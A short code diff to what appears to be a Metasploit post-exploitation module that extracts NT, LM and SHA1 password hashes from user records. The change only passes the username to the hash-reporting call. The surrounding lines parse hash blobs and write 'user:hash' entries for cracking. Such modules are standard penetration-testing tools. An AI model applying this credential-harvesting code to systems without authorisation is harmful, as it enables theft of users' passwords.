@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Post
 
         # Check if NT HASH is present
         if hash_decoded =~ /4F1010/
-          report_nt_hash(hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0])
+          report_nt_hash(hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0], user)
         end
 
         # slice out the sha512 hash + salt
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Post
           hash_file << "#{user}:#{sha1_hash}"
         end
         if nt_hash !~ /000000000000000/
-          report_nt_hash(nt_hash)
+          report_nt_hash(nt_hash, user)
         end
         if lm_hash !~ /0000000000000/
           print_status("LM:#{user}:#{lm_hash}")
